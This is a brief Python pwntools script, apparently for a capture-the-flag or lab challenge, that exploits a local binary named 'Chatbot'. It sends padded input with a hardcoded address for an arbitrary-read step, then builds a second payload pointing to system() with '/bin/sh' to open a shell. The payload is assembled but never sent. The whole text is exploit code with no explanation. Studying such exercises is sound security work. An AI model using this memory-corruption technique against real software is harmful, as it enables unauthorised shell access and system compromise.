import sys
import struct
from pwn import *

sh = process("./Chatbot")
print(sh.recvline())
# step 1 arbitrary reading

pad = "AAAAAAAA"*4
read_addr = struct.pack("<Q", 0x555555755022)

s1 = pad + read_addr + "\n"
sh.sendline(s1)
res = sh.recvline()
while res:
  print(res)
  res = sh.recvline()
# step 2 arbitrary writing
system = struct.pack("<Q", 0x555555755022-0x411d0)
s2 = system + "\n" + "/bin/sh\n"

exploit = s1 + s2
#sys.stdout.write(exploit)
